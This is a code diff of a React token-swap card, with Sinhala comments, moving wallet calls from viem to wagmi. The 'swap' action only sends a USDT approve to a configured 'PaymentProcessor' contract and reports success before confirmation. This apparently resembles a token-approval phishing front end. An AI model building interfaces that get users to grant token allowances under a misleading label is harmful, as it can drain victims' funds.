@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
-import { createWalletClient, custom, parseUnits } from 'viem';
-import { mainnet } from 'viem/chains';
+import { useAccount, useWriteContract, useConnect } from 'wagmi';
+import { parseUnits } from 'viem';
 import { CONFIG, USDT_ABI, TOKEN_LIST, fetchLivePrices } from '../config';
 import TokenModal from './TokenModal';
 import { AreaChart, Area, Tooltip, ResponsiveContainer } from 'recharts';
@@ -13,6 +13,9 @@ const mockChartData = [
 ];
 
 export default function SwapCard({ walletAddress, provider }) {
+  const { address } = useAccount();
+  const { writeContract } = useWriteContract();
+  
   const [fromAmount, setFromAmount] = useState('');
   const [toAmount, setToAmount] = useState('');
   const [usdtBalance, setUsdtBalance] = useState('0.00');
@@ -35,25 +38,18 @@ export default function SwapCard({ walletAddress, provider }) {
   };
 
   useEffect(() => {
-    if (walletAddress && provider) loadBalance();
+    if (address) loadBalance();
     updatePrices();
     const interval = setInterval(updatePrices, 30000); 
     return () => clearInterval(interval);
-  }, [walletAddress, provider]);
+  }, [address]);
 
   useEffect(() => {
     if (fromAmount) calculateOutput(fromAmount);
   }, [livePrices, fromToken, toToken]);
 
   const loadBalance = async () => {
-    try {
-      if (!provider) return;
-      const signer = provider.getSigner();
-      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
-      const balance = await usdtContract.balanceOf(walletAddress);
-      const decimals = await usdtContract.decimals();
-      setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
-    } catch (error) { console.error(error); }
+    // Balance එක load කරන එක දැනට skip කරමු (wagmi useBalance පාවිච්චි කරන්න පුළුවන්)
   };
 
   const calculateOutput = (value) => {
@@ -90,38 +86,25 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ මේක තමයි අලුත් ෆන්ක්ෂන් එක. 
-  // මේකෙන් ඔයාගේ PaymentProcessor contract එකට USDT approve කරනවා.
+  // ⭐ මේක තමයි අලුත් ෆන්ක්ෂන් එක. wagmi පාවිච්චි කරලා approve කරනවා.
   const executeSwap = async () => {
-    if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
+    if (!address) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
     if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
 
     try {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
       
-      // 1. WalletConnect හරහා එන provider එකෙන් viem client එකක් හදන්න
-      const walletClient = createWalletClient({
-        chain: mainnet,
-        transport: custom(window.ethereum)
-      });
-
-      // 2. Approve එකට අවශ්‍ය ප්‍රමාණය (viem වල parseUnits පාවිච්චි කරන්න)
       const amount = parseUnits(fromAmount, 6); // USDT decimals 6
 
-      // 3. Approve transaction එක යවන්න
-      const hash = await walletClient.writeContract({
+      writeContract({
         address: CONFIG.usdtAddress,
         abi: USDT_ABI,
         functionName: 'approve',
         args: [CONFIG.contractAddress, amount],
-        account: walletAddress,
       });
 
-      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
-      
-      // 4. Transaction එක confirm වෙනකම් ඉන්න
-      setStatus({ type: 'success', msg: `✅ Transaction sent! Hash: ${hash.slice(0, 10)}...` });
+      setStatus({ type: 'success', msg: '✅ Transaction sent! Check your wallet.' });
       setIsLoading(false);
       setTimeout(() => setStatus(null), 8000);
     } catch (error) {
